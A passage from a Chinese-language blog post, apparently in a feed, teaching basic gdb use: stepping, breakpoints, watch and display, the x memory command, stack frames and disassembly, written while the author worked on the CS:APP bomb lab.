<code>n</code>或者 s进行单步调试,(两者的区别在于,step遇到函数会进入函数, next不会). </p><p>值得说明的是, 执行一条命令后, 直接按回车, 会重复执行上一条命令.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151435600.png" alt="image-20200621151435600"></p><p>现在应该会单步调试了吧.</p><p>使用 <code>bt</code>,可以查看函数调用堆栈:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152801080.png" alt="image-20200621152801080"></p><p>使用 <code>p a</code>可以打印a变量的值:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152828266.png" alt="image-20200621152828266"></p><p>p还可以使用格式符, 如 <code>p /x a</code>把a以hex格式打印, 对于数组,如 int arr[3]; 可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *arr@3</span><br></pre></td></tr></table></figure><p>打印. @后跟的是数组长度. </p><p>但是到现在, 有一个很严重的问题, 那就是在debug的时候 ,没办法查看源代码。</p><p>gdb当然想到了这个问题, 我们可以通过 <code>l</code>命令, 展示最近的源代码.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151620849.png" alt="image-20200621151620849"></p><p>l 命令默认展示10行代码, 可以通过 l [start_line] [end_line] 展示start_line – end_line之间的代码.</p><p>可是, 这还是非常难受, 比如我甚至不知道当前执行到哪儿了.</p><p>ok, 接下来介绍一个必备的命令: layout</p><p>执行 <code>h layout</code>可以查看layout的帮助:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151826603.png" alt="image-20200621151826603"></p><p>我们关注 LAYOUT-NAME即可.</p><p>可以看到,LAYOUT-NAME有四个选项:</p><ul><li><p>layout src. 展示源代码和命令窗口:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151917633.png" alt="image-20200621151917633"></p><p>这就搞定了我们在调试代码时,要查看同步查看源代码的需求. 上面展示了我们当前执行到了哪里. B+展示了我们的断点位置.</p></li><li><p>layout asm</p><p>反汇编布局, 可以查看对应的反汇编代码.</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152053830.png" alt="image-20200621152053830"></p><p>这个在bomblab中肯定是要用的. 平常基本不适用,毕竟汇编用得确实不多.</p><ul><li>layout split</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152229097.png" alt="image-20200621152229097"></p><p>这个就是同时展示, src和asm. 没什么好说的.</p><ul><li>layout regs</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152325113.png" alt="image-20200621152325113"></p><p>展示寄存器窗口. 这个在bomblab中也是必备的. 可以分析各寄存器当前的值. <strong>值得注意的是,有时候终端会花屏, 这时执行refresh(或Ctrl+L)命令即可</strong></p><p>ok,  上面都是一些基础操作. 下面按照需求,一个个讲解.</p><h3 id="问题1-如何设置条件断点"><a href="#问题1-如何设置条件断点" class="headerlink" title="问题1: 如何设置条件断点?"></a>问题1: 如何设置条件断点?</h3><p>比如在main函数中, 我们只在 a = 10时,才停下. 则可以通过 <code>b 16 if a == 10</code>命令完成.</p><p>上面代码的含义时， 在代码16行， 如果a==10，则停下，否则忽略。</p><h3 id="问题2-卡在一直长循环-如何跳出这个循环"><a href="#问题2-卡在一直长循环-如何跳出这个循环" class="headerlink" title="问题2: 卡在一直长循环, 如何跳出这个循环?"></a>问题2: 卡在一直长循环, 如何跳出这个循环?</h3><p>看下面这个代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">1000</span>; i++)</span><br><span class="line"><span class="number">2</span>: &#123;</span><br><span class="line"><span class="number">3</span>: <span class="comment">// do something</span></span><br><span class="line"><span class="number">4</span>: &#125;</span><br><span class="line"><span class="number">5</span>: <span class="keyword">int</span> a = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>假设我们在第一行打了断点 <code>b 1</code>, 现在通过 <code>n或i</code>进入了for循环, 此时如何快速执行完这个循环呢? 可以在第5行打断点 <code>b 5</code>, 然后执行 <code>c</code>  continue命令, 就可以快速执行到第5行了.</p><h3 id="问题3-如何删除断点或disable断点"><a href="#问题3-如何删除断点或disable断点" class="headerlink" title="问题3: 如何删除断点或disable断点"></a>问题3: 如何删除断点或disable断点</h3><p>其实前文已经提到了, 每个断点都有一个id, 通过 <code>info b</code>查看, 然后执行d breakpointid即可.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621153643799.png" alt="image-20200621153643799"></p><h3 id="问题4-如何快速清除一个函数中的所有断点"><a href="#问题4-如何快速清除一个函数中的所有断点" class="headerlink" title="问题4: 如何快速清除一个函数中的所有断点"></a>问题4: 如何快速清除一个函数中的所有断点</h3><p>使用clear命令, clear FUNCTION_NAME 即可.</p><h3 id="问题5-如何保存一个程序的快照"><a href="#问题5-如何保存一个程序的快照" class="headerlink" title="问题5: 如何保存一个程序的快照"></a>问题5: 如何保存一个程序的快照</h3><p>有时候我们在debug时, 在到达某个debug点之前, 要做很多重复的工作, 这时,我们可以在这个点上生成一个快照, 这次debug失败后, 下次直接从这个快照中继续运行. </p><p>此时就可以用checkpoint来做.</p><p>比如上文的程序, 我可以当 a = 10时,生成一个快照, 然后下次直接从a=10启动程序.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154337275.png" alt="image-20200621154337275"></p><p>执行 c, run完当前进程. 会看到context自动切换到了下一个进程.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154515768.png" alt="image-20200621154515768"></p><p>或者手动执行 <code>restart checkpointid</code>, 手动切换.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154556161.png" alt="image-20200621154556161"></p><h3 id="问题6-监听某个变量-变量发生变化时-自动打印该变量"><a href="#问题6-监听某个变量-变量发生变化时-自动打印该变量" class="headerlink" title="问题6: 监听某个变量, 变量发生变化时, 自动打印该变量"></a>问题6: 监听某个变量, 变量发生变化时, 自动打印该变量</h3><p>使用watch 命令.</p><p>比如监听i变量,只要i发生了变化, 就自动打印它.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154853484.png" alt="image-20200621154853484"></p><h3 id="问题7-每次停顿-都要打印一些想要监听的变量"><a href="#问题7-每次停顿-都要打印一些想要监听的变量" class="headerlink" title="问题7: 每次停顿, 都要打印一些想要监听的变量"></a>问题7: 每次停顿, 都要打印一些想要监听的变量</h3><p>使用display命令.</p><p>display [var] 可以在每次程序debug中停顿时,打印你想知道的变量值.</p><p>如,我要监听 i可以:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display i</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155215978.png" alt="image-20200621155215978"></p><p>可以看到, 每次停下, i的值都打印了出来.</p><h3 id="问题8-如何切换stack-frame"><a href="#问题8-如何切换stack-frame" class="headerlink" title="问题8: 如何切换stack frame"></a>问题8: 如何切换stack frame</h3><p>有时候, 我们进入到某个函数后, 想要重新查看另一个stack frame的局部变量.比如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155435491.png" alt="image-20200621155435491"></p><p>当前在findSqure stack frame中, 想要切换到main frame中去.</p><p>可以通过 <code>frame frameid</code>切换, 这里是<code>frame 1</code>切换.</p><p>如何函数调用层次过深, 可以使用frame命令,如果只是想查看两个较为临近的frame, 使用 <code>up num或down num</code>命令更合适.up代表向上走多少个frame, down则是向下.</p><h3 id="问题9-更换执行程序"><a href="#问题9-更换执行程序" class="headerlink" title="问题9:更换执行程序"></a>问题9:更换执行程序</h3><p>想要在gdb中直接加载另一个程序, 使用<code>file [file_path]</code> 命令即可.</p><h3 id="问题10-打印某个内存区域中的值"><a href="#问题10-打印某个内存区域中的值" class="headerlink" title="问题10:打印某个内存区域中的值"></a>问题10:打印某个内存区域中的值</h3><p>这个问题在c语言中相当场景, 比如要打印数组的value, 打印某个特定内存位置的值. 都可以使用.</p><p>使用 <code>x</code>命令解决这个问题, x命令的格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /[num][format][width] address</span><br></pre></td></tr></table></figure><ul><li>address没什么可说的.就是你要查看的内存开始地址.</li><li>num: 打印多少个单元</li><li>format: 以什么格式打印, 通过有 十六进制(x), 十进制(d), 八进制(o), 字符(c). 具体可通过h x查看</li><li>width: 一个单元的宽度, 常见单位为 byte 8bit(b), half word 16bit(h), word 32bit (w), gaint 64bit(g). 同样,可通过h x查看.</li></ul><p>下面就用一些例子来说明吧.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>现在,要以 字符形式打印buf. 应该怎么写命令?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /10cb buf</span><br></pre></td></tr></table></figure><ul><li>10: 代表10个单元</li><li>c: 代表以字符形式打印</li><li>b: 一个单元1个字节,(从语言中的char的长度为1)</li></ul><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /4dw arr</span><br></pre></td></tr></table></figure><ul><li>4: 4个单元</li><li>d: 十进制打印</li><li>w: 一个单元32bit</li></ul><p>ok, 到这里基本的调试操作应该都满足了, 如果遇到什么不知道的,直接百度或者查看help吧。</p><h2 id="2-反汇编"><a href="#2-反汇编" class="headerlink" title="2. 反汇编"></a>2. 反汇编</h2><p>gdb也是支持反汇编的, 这也是bomblab必备的能力.</p><p>同样以下面代码为例:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>演示如何反汇编.</p><p>启动gdb,  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">r 1</span><br></pre></td></tr></table></figure><p>通过 disassemble命令进行反汇编.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161232831.png" alt="image-20200621161232831"></p><p>如果指向反汇编时,添加源代码和行号, 执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble &#x2F;s</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161438046.png" alt="image-20200621161438046"></p><p>上面的命令用来临时看看汇编还可以, 但是要跟踪还是得使用layout命令.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">layout asm</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161534374.png" alt="image-20200621161534374"></p><h3 id="问题1-为某个特定的指令地址加断点"><a href="#问题1-为某个特定的指令地址加断点" class="headerlink" title="问题1: 为某个特定的指令地址加断点"></a>问题1: 为某个特定的指令地址加断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *address</span><br><span class="line">b *(function_name + offset)</span><br></pre></td></tr></table></figure><p>如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161656224.png" alt="image-20200621161656224"></p><p>ok, gdb的简单使用就到这里了.</p><p><strong>还有个打断点的方式是, 代码走到了指令的位置, 直接输入b, 就在当前位置打了断点.</strong></p><h3 id="问题2：-导出汇编代码"><a href="#问题2：-导出汇编代码" class="headerlink" title="问题2： 导出汇编代码"></a>问题2： 导出汇编代码</h3><p>好吧，这个我并不知道如何用gdb实现， 改用 objdump -d 命令即可实现。</p><h2 id="3-额外推荐"><a href="#3-额外推荐" class="headerlink" title="3. 额外推荐"></a>3. 额外推荐</h2><p>cgdb: gdb的包装， 默认打开了源代码试图，而且采用了vim模式查看源代码，熟悉vim和gdb的可以试试。</p><p>gdbgui: 这个还不错, 采用browser进行调试,比只使用gdb还是好多了.</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">gdb command in Linux with examples - GeeksforGeeks<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzI0MjU2NjkzL2FydGljbGUvZGV0YWlscy80NzI5ODUxMw==" title="https://blog.csdn.net/baidu_24256693/article/details/47298513">gdb中x的用法_lxy的专栏-CSDN博客_gdb x<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbmdjaHV3YW5nMTg2OC9hcnRpY2xlL2RldGFpbHMvODYxMzIyODE=" title="https://blog.csdn.net/songchuwang1868/article/details/86132281">GDB常用命令与技巧（超好用的图形化gdbgui）_Likes的博客-CSDN博客_gdbgui<i class="fa fa-external-link"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直用惯了IDE集成的debug工具, 忽略了gdb这个命令行debug工具. 而最近在做csapp的bomblab, 就不得不来学习它了. 所以特此记录.&lt;/p&gt;
&lt;h2 id=&quot;1-基本使用&quot;&gt;&lt;a href=&quot;#1-基本使用&quot; class=&quot;headerlink&quot; title=&quot;1. 基本使用&quot;&gt;&lt;/a&gt;1. 基本使用&lt;/h2&gt;&lt;p&gt;考虑以下我们在IDE中要进行debug一般需要哪些功能?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置断点(包含条件断点)&lt;/li&gt;
&lt;li&gt;开启debug&lt;/li&gt;
&lt;li&gt;step in, step over, continue&lt;/li&gt;
&lt;li&gt;观察某些值的变化, 打印数组value, 打印某个地址value&lt;/li&gt;
&lt;li&gt;函数调用stack, 切换stack&lt;/li&gt;
&lt;li&gt;临时更改某个变量,参数的值&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面讲解如何用gdb实现这些功能。&lt;/p&gt;
&lt;p&gt;为了更方便讲解, 这里提前把所有常用命令贴出, 读者可不用一一记住, 在逐渐使用的过程中,自然就能形成记住了.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
      <category term="gdb" scheme="https://www.ravenxrz.ink/tags/gdb/"/>
    
  </entry>
  
</feed>
